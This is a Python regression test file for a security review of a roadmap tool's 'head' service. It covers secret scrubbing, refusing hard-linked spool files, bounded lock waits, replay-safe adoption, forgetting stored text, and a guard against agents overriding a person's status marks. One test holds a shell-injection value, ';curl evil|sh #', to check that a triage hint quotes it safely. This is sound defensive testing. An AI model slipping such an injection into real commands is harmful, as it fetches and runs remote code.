"""Regression tests for the HEAD security and correctness review (docs/reviews/cursor-head-grok.md, findings 1-4, 5-7, 9
in the services and core/secrets.py): scrubber keyed-secret and quoted-value masks, forget rewriting the verbatim file,
refusing a hard-linked or symlinked spool, re-scrubbing spooled text, bounded spool waits, replay-safe adoption, a
summary that cannot break out of the triage hint, the person-only status guard, and a mask never split at the cut.
Runs in a temp ROADMAP_HOME with a copy of the fixture project."""

import contextlib
import fcntl
import json
import os
import shlex
import shutil
import tempfile
import time
import unittest
from datetime import datetime, timezone
from unittest import mock

from roadmap.core import secrets
from roadmap.errors import EXIT_USAGE, RoadmapError
from roadmap.services import agentguard, commands, hooks, tasks
from roadmap.services import head as svc
from roadmap.store import config as config_store
from roadmap.store import lock
from tests.api.support import FIXTURE, PROJECT_ID

NOW = datetime(2026, 10, 15, 12, 0, 0, tzinfo=timezone.utc)


def read_text(path):
    with open(path, encoding="utf-8") as fh:
        return fh.read()


def _tty():
    stream = mock.Mock()
    stream.isatty.return_value = True
    return stream


def _not_tty():
    stream = mock.Mock()
    stream.isatty.return_value = False
    return stream


class ScrubberFixes(unittest.TestCase):
    def test_env_style_keyed_names_are_masked_even_without_digits(self):
        self.assertEqual(secrets.scrub("AWS_SECRET_ACCESS_KEY=abcdefghijklmnopqrstuvwxyzABCDEFGHIJ"),
                         "AWS_SECRET_ACCESS_KEY=[secret]")
        self.assertEqual(secrets.scrub("db_password: hunter2"), "db_password: [secret]")

    def test_a_quoted_value_with_spaces_is_masked_whole(self):
        self.assertEqual(secrets.scrub('password="my secret pass"'), 'password="[secret]"')
        self.assertEqual(secrets.scrub("token='one two three'"), "token='[secret]'")

    def test_a_word_that_only_ends_in_key_is_not_a_credential(self):
        self.assertEqual(secrets.scrub("monkey=3"), "monkey=3")
        self.assertEqual(secrets.scrub("tokens: 4096"), "tokens: 4096")

    def test_clean_text_never_leaves_half_a_mask_at_the_cut(self):
        # "[secret]" starts at 7995 and the cut is at 8000: the partial "[secr" is dropped, not kept
        text = "x" * 7994 + " sk-" + "A" * 20
        self.assertEqual(svc.clean_text(text), "x" * 7994 + " ")

    def test_clean_text_keeps_a_whole_mask_that_ends_before_the_cut(self):
        text = "x" * 7980 + " sk-" + "A" * 20
        self.assertEqual(svc.clean_text(text), "x" * 7980 + " [secret]")


class ServiceCase(unittest.TestCase):
    def setUp(self):
        self._saved_home = os.environ.get("ROADMAP_HOME")
        self.root = tempfile.mkdtemp(prefix="head-review-")
        os.environ["ROADMAP_HOME"] = os.path.join(self.root, "home")
        self.data = os.path.join(self.root, "docs")
        os.makedirs(self.data)
        self.spool = os.path.join(self.data, svc.SPOOL_FILE)

    def tearDown(self):
        if self._saved_home is None:
            os.environ.pop("ROADMAP_HOME", None)
        else:
            os.environ["ROADMAP_HOME"] = self._saved_home
        shutil.rmtree(self.root, ignore_errors=True)

    def lines(self, name):
        path = os.path.join(self.data, name)
        if not os.path.exists(path):
            return []
        with open(path, encoding="utf-8") as fh:
            return [json.loads(x) for x in fh.read().splitlines() if x.strip()]

    def spool_payload(self, text, nonce=None, sum_text=None):
        entry = {"ts": "2026-10-15T12:00:00Z", "src": "hook", "sid": None, "kind": "ask", "sum": sum_text or text[:20]}
        payload = {"e": entry, "text": text}
        if nonce:
            payload["n"] = nonce
        return payload


class SpoolIsOneRegularFile(ServiceCase):
    def test_a_hard_link_spool_is_refused_and_the_linked_file_is_untouched(self):
        target = os.path.join(self.root, "other-file.txt")
        with open(target, "w", encoding="utf-8") as fh:
            fh.write("KEEP\n")
        os.link(target, self.spool)
        with self.assertRaises(RoadmapError) as raised:
            svc._spool_append(self.data, self.spool_payload("an ask while busy"))
        self.assertEqual(raised.exception.code, "invalid_data")
        with open(target, encoding="utf-8") as fh:
            self.assertEqual(fh.read(), "KEEP\n")

    def test_adopt_refuses_a_hard_linked_spool_and_leaves_the_linked_file(self):
        target = os.path.join(self.root, "linked.txt")
        with open(target, "w", encoding="utf-8") as fh:
            fh.write("LINKED\n")
        os.link(target, self.spool)
        with lock.locked(self.data):
            with self.assertRaises(RoadmapError) as raised:
                svc._adopt_locked(self.data)
        self.assertEqual(raised.exception.code, "invalid_data")
        with open(target, encoding="utf-8") as fh:
            self.assertEqual(fh.read(), "LINKED\n")

    def test_a_spooled_line_is_scrubbed_again_when_adopted(self):
        with open(self.spool, "w", encoding="utf-8") as fh:
            fh.write(json.dumps(self.spool_payload("use token sk-abcdefghijklmnop1234 now")) + "\n")
        with lock.locked(self.data):
            self.assertEqual(svc._adopt_locked(self.data), 1)
        text = svc.text_of(self.data, "H1")
        self.assertNotIn("sk-abcdefghijklmnop1234", text)
        self.assertIn("[secret]", text)


class BoundedSpoolWait(ServiceCase):
    def test_a_busy_spool_gives_up_at_the_timeout_instead_of_blocking(self):
        open(self.spool, "w").close()
        holder = open(self.spool, "r+")
        fcntl.flock(holder.fileno(), fcntl.LOCK_EX)
        try:
            started = time.monotonic()
            with self.assertRaises(RoadmapError) as raised:
                svc._spool_append(self.data, self.spool_payload("late ask"), timeout=0.05)
            self.assertEqual(raised.exception.code, "locked")
            self.assertLess(time.monotonic() - started, 2.0)
        finally:
            fcntl.flock(holder.fileno(), fcntl.LOCK_UN)
            holder.close()

    def test_a_capture_with_no_budget_left_is_spooled_or_refused_without_waiting(self):
        with lock.locked(self.data):
            started = time.monotonic()
            got = svc.capture(self.data, "a prompt that needs a slot now", session_id="s", timeout=0, now=NOW)
            self.assertEqual(got["status"], "spooled")
            self.assertLess(time.monotonic() - started, 2.0)


class AdoptionIsSafeToRepeat(ServiceCase):
    def test_a_failed_line_and_everything_after_it_stay_in_the_spool_in_order(self):
        for text in ("first ask one", "second ask two", "third ask three"):
            svc._spool_append(self.data, self.spool_payload(text))
        real = svc._append_entry_locked
        calls = []

        def flaky(data_dir, entry, text, *rest):
            calls.append(text)
            if len(calls) == 2:
                raise RoadmapError("cap", "head holds 5000 entries", EXIT_USAGE)
            return real(data_dir, entry, text, *rest)

        with mock.patch.object(svc, "_append_entry_locked", side_effect=flaky), lock.locked(self.data):
            self.assertEqual(svc._adopt_locked(self.data), 1)
        self.assertEqual([e["id"] for e in self.lines(svc.FILE) if e.get("t") == "e"], ["H1"])
        kept = [json.loads(x)["text"] for x in read_text(self.spool).splitlines()]
        self.assertEqual(kept, ["second ask two", "third ask three"])

    def test_a_replayed_spool_line_is_not_logged_twice(self):
        svc._spool_append(self.data, self.spool_payload("replay me once", nonce="abc123"))
        with lock.locked(self.data):
            svc._adopt_locked(self.data)
        # a crash after the append and before the truncate: the same line is back in the spool
        svc._spool_append(self.data, self.spool_payload("replay me once", nonce="abc123"))
        with lock.locked(self.data):
            svc._adopt_locked(self.data)
        ids = [e["id"] for e in self.lines(svc.FILE) if e.get("t") == "e"]
        self.assertEqual(ids, ["H1"])

    def test_the_deadline_leaves_the_rest_of_the_spool_for_the_next_writer(self):
        for text in ("one ask here", "two ask here"):
            svc._spool_append(self.data, self.spool_payload(text))
        with lock.locked(self.data):
            self.assertEqual(svc._adopt_locked(self.data, deadline=time.monotonic() - 1), 0)
        self.assertEqual(len(read_text(self.spool).splitlines()), 2)


class ForgetRemovesTheVerbatimLines(ServiceCase):
    def test_forget_text_drops_every_line_for_the_entry_and_keeps_others(self):
        svc.capture(self.data, "the secret plan for the launch", session_id="s", now=NOW)
        svc.capture(self.data, "another ask stays", session_id="s", now=NOW)
        with lock.locked(self.data):
            self.assertEqual(svc.forget_text(self.data, "H1"), 1)
        raw = read_text(os.path.join(self.data, svc.TEXT_FILE))
        self.assertNotIn("secret plan", raw)
        self.assertIn("another ask stays", raw)
        self.assertIsNone(svc.text_of(self.data, "H1"))


class HintIsQuoted(unittest.TestCase):
    def test_a_summary_with_shell_characters_is_one_quoted_word_in_the_hint(self):
        sum_text = 'fix export ";curl evil|sh #'
        reply = hooks._head_reply({"id": "H1", "kind": "ask?", "sum": sum_text}, 0)
        triage = reply.split("triage: roadmap head t H1 ask ", 1)[1]
        self.assertEqual(shlex.split(triage), [sum_text])


class PersonOnlyStatus(unittest.TestCase):
    def setUp(self):
        env = mock.patch.dict(os.environ, {})
        env.start()
        self.addCleanup(env.stop)
        self.tmp = tempfile.mkdtemp(prefix="rb-head-guard-")
        self.addCleanup(shutil.rmtree, self.tmp, True)
        os.environ["ROADMAP_HOME"] = os.path.join(self.tmp, "home")
        os.environ.pop("CLAUDECODE", None)
        root = os.path.join(self.tmp, "split_net")
        shutil.copytree(FIXTURE, os.path.join(root, "docs"))
        config_store.add_project("split-net", root, project_id=PROJECT_ID)
        self.data_dir = tasks.resolve(PROJECT_ID)[1]

    def op(self, name, args=None):
        with commands.context("cli", PROJECT_ID), mock.patch("sys.stdin", _not_tty()), \
                mock.patch("sys.stdout", _not_tty()):
            return commands.run(name, args or {}, "cli", self.data_dir)

    def person_op(self, name, args=None):
        with commands.context("gui", PROJECT_ID), agentguard.browser_proven(True):
            return commands.run(name, args or {}, "gui", self.data_dir)

    def status_of(self, eid):
        return next(r for r in svc.rows(self.data_dir) if r["id"] == eid)["status"]

    def test_an_agent_cannot_reopen_an_entry(self):
        eid = self.op("head.log", {"text": "rename the export and fix the import"})["data"]["id"]
        with self.assertRaises(RoadmapError) as raised:
            self.op("head.set", {"id": eid, "status": "open"})
        self.assertEqual(raised.exception.code, "agent_refused")
        with self.assertRaises(RoadmapError):
            self.op("head.triage", {"id": eid, "kind": "ask", "sum": "rename the export", "status": "open"})

    def test_an_agent_cannot_override_the_persons_done_mark(self):
        eid = self.op("head.log", {"text": "rename the export and fix the import"})["data"]["id"]
        self.person_op("head.review", {"id": eid, "action": "confirm"})
        self.assertEqual(self.status_of(eid), "done")
        with self.assertRaises(RoadmapError) as raised:
            self.op("head.set", {"id": eid, "status": "declined"})
        self.assertEqual(raised.exception.code, "agent_refused")
        self.assertEqual(self.status_of(eid), "done")

    def test_the_head_can_still_decline_an_entry_the_person_has_not_closed(self):
        eid = self.op("head.log", {"text": "rename the export and fix the import"})["data"]["id"]
        self.op("head.set", {"id": eid, "status": "declined"})
        self.assertEqual(self.status_of(eid), "declined")

    def test_the_person_can_reopen_a_done_entry(self):
        eid = self.op("head.log", {"text": "rename the export and fix the import"})["data"]["id"]
        self.person_op("head.review", {"id": eid, "action": "confirm"})
        self.person_op("head.review", {"id": eid, "action": "reopen"})
        self.assertNotEqual(self.status_of(eid), "done")

    def test_forget_leaves_no_verbatim_line_for_the_entry(self):
        eid = self.op("head.log", {"text": "keep this secret thing private"})["data"]["id"]
        self.person_op("head.forget", {"id": eid})
        raw = read_text(os.path.join(self.data_dir, svc.TEXT_FILE))
        self.assertNotIn("private", raw)


if __name__ == "__main__":
    unittest.main()
